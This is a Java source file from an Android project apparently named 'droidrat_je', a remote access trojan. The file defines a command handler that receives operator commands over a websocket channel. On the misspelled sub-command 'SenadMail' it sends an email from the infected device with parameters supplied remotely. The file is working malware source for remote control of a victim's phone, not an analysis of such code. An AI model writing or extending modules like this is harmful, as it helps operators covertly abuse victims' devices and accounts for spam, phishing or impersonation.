package com.je_chen.droidrat_je.rat.command;

import android.content.Context;

import com.je_chen.droidrat_je.rat.command.process_super.CommandFather;
import com.je_chen.droidrat_je.rat.modules.appintent.mail.SendMail;

import static com.je_chen.droidrat_je.service.command.ProcessCommandService.websockets;

public class MailCommand extends CommandFather {

    private final Context context;

    private final SendMail sendMail;

    public MailCommand(Context context) {
        this.context = context;
        sendMail = new SendMail();
    }

    @Override
    public void send(String value) {
        websockets.send(value);
    }

    @Override
    public void processCommand(String command) {
        try {
            String[] rawCommandArray = command.split(" ");
            switch (rawCommandArray[1]) {

                case "SenadMail":
                    sendMail.sendMail(context, rawCommandArray[2], rawCommandArray[3], rawCommandArray[4]);
                    break;

            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
